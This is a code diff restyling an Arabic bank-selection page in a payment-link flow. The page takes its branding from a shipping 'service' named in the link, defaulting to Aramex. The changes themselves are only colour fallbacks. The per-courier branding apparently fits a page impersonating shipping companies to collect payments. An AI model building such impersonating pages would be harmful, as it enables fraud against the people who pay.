@@ -33,6 +33,19 @@ const PaymentBankSelector = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
+  // Define comprehensive colors object with fallbacks
+  const colors = {
+    primary: branding.colors?.primary || "#CE1126",
+    secondary: branding.colors?.secondary || "#00732F",
+    accent: branding.colors?.accent || "#000000",
+    background: branding.colors?.background || "#FFFFFF",
+    surface: branding.colors?.surface || "#F5F5F5",
+    border: branding.colors?.border || "#E0E0E0",
+    text: branding.colors?.text || "#000000",
+    textLight: branding.colors?.textLight || "#666666",
+    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
+  };
   
   const shippingInfo = linkData?.payload as any;
 
@@ -129,14 +142,15 @@ const PaymentBankSelector = () => {
   if (linkLoading || !linkData) {
     return (
       <div 
-        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
+        className="min-h-screen py-4 sm:py-12 flex items-center justify-center" 
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+          backgroundColor: colors.surface,
+          backgroundImage: `linear-gradient(135deg, ${colors.primary}08, ${colors.secondary}08)`
         }}
       >
         <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
+          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: colors.primary }} />
           <p className="text-muted-foreground">جاري تحميل البيانات...</p>
         </div>
       </div>
@@ -159,10 +173,11 @@ const PaymentBankSelector = () => {
   
   return (
     <div 
-      className="min-h-screen py-4 sm:py-12 bg-background" 
+      className="min-h-screen py-4 sm:py-12" 
       dir="rtl"
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        backgroundColor: colors.surface,
+        backgroundImage: `linear-gradient(135deg, ${colors.primary}08, ${colors.secondary}08)`
       }}
     >
       <div className="container mx-auto px-4 max-w-2xl">
@@ -180,14 +195,14 @@ const PaymentBankSelector = () => {
             <div
               className="w-12 h-12 rounded-full flex items-center justify-center"
               style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
               }}
             >
               <Building2 className="w-6 h-6 text-white" />
             </div>
             <div>
-              <h1 className="text-2xl font-bold">اختر البنك</h1>
-              <p className="text-sm text-muted-foreground">
+              <h1 className="text-2xl font-bold" style={{ color: colors.text }}>اختر البنك</h1>
+              <p className="text-sm text-muted-foreground" style={{ color: colors.textLight }}>
                 {serviceName} - {formattedAmount}
               </p>
             </div>
@@ -224,13 +239,10 @@ const PaymentBankSelector = () => {
               {banks.map((bank) => (
                 <Card
                   key={bank.id}
-                  className={`p-4 cursor-pointer transition-all hover:shadow-md ${
-                    selectedBank === bank.id
-                      ? 'ring-2 bg-primary/5'
-                      : 'hover:bg-accent/50'
-                  }`}
+                  className={`p-4 cursor-pointer transition-all hover:shadow-md border-2`}
                   style={{
-                    borderColor: selectedBank === bank.id ? branding.colors.primary : undefined,
+                    borderColor: selectedBank === bank.id ? colors.primary : colors.border,
+                    backgroundColor: selectedBank === bank.id ? `${colors.primary}05` : colors.background
                   }}
                   onClick={() => handleBankSelect(bank.id)}
                 >
@@ -239,20 +251,20 @@ const PaymentBankSelector = () => {
                       className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                       style={{
                         background: selectedBank === bank.id
-                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                          ? `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
                           : '#64748b',
                       }}
                     >
                       {bank.nameAr.charAt(0)}
                     </div>
                     <div className="flex-1">
-                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
-                      <p className="text-xs text-muted-foreground">{bank.name}</p>
+                      <h3 className="font-semibold text-sm" style={{ color: colors.text }}>{bank.nameAr}</h3>
+                      <p className="text-xs text-muted-foreground" style={{ color: colors.textLight }}>{bank.name}</p>
                     </div>
                     {selectedBank === bank.id && (
                       <div
                         className="w-5 h-5 rounded-full flex items-center justify-center"
-                        style={{ backgroundColor: branding.colors.primary }}
+                        style={{ backgroundColor: colors.primary }}
                       >
                         <svg
                           className="w-3 h-3 text-white"
@@ -277,10 +289,10 @@ const PaymentBankSelector = () => {
               <Button
                 onClick={handleContinue}
                 disabled={!selectedBank}
-                className="w-full h-12 text-base font-semibold"
+                className="w-full h-12 text-base font-semibold text-white"
                 style={{
                   background: selectedBank
-                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    ? `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
                     : undefined,
                 }}
               >
@@ -291,6 +303,11 @@ const PaymentBankSelector = () => {
                 onClick={handleSkip}
                 variant="outline"
                 className="w-full h-12 text-base"
+                style={{ 
+                  borderColor: colors.border,
+                  color: colors.text,
+                  backgroundColor: colors.background
+                }}
               >
                 تخطي واستخدام أي بنك
               </Button>
